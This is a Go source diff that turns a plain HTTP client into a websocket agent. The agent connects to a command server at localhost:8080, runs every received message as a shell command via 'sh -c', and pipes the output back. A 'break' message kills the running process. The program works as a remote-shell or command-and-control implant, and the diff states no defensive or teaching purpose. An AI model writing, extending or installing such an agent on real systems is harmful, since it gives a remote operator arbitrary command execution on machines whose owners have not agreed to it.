@@ -1,41 +1,70 @@
 package main
 
 import (
-	"bufio"
 	"log"
-	"net/http"
+	"os/exec"
+
+	"golang.org/x/net/websocket"
 )
 
-const serverAddr = "localhost:8080"
+const (
+	serverAddr = "http://localhost:8080/commands?id="
+	url        = "ws://localhost:8080/commands?id="
+)
+
+var (
+	commandExecChan = make(chan string)
+	secondCommand   = make(chan string)
+)
 
 func main() {
 
-	// HTTP client
-	req, err := http.NewRequest("GET", "http://"+serverAddr+"/commands", nil)
+	id := "cum"
+	generatedURL := url + id
+	generatedOrigin := serverAddr + id
+
+	conn, err := websocket.Dial(generatedURL, "", generatedOrigin)
 	if err != nil {
-		log.Fatal("Error creating HTTP request: ", err.Error())
+		log.Fatal(err)
+
 	}
+	var cmd *exec.Cmd
 
-	req.Header.Set("id", "cum")
-	client := http.Client{}
+	go func() {
+		for {
+			command := <-commandExecChan
+			log.Println(command)
+			if command == "break" {
+				secondCommand <- command
+				continue
+			}
+			cmd = exec.Command("sh", "-c", command)
+			cmd.Stdout = conn
+			cmd.Stderr = conn
 
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error making HTTP request: ", err.Error())
-	}
+			cmd.Start()
 
-	// Read the response header
-
-	// Read the response body
-
-	reader := bufio.NewReader(resp.Body)
-	for {
-		line, err := reader.ReadBytes('\n')
-		if err != nil {
-			break
 		}
+	}()
+	go func() {
 
-		log.Println(string(line))
+		for {
+			<-secondCommand
+			log.Println("okay , wait please")
+			if err := cmd.Process.Kill(); err != nil {
+				log.Println(err)
+			}
+
+		}
+	}()
+
+	for {
+		msg := make([]byte, 500)
+		n, err := conn.Read(msg)
+		if err != nil {
+			log.Fatal(err)
+		}
+		commandExecChan <- string(msg[:n])
 	}
 
 }
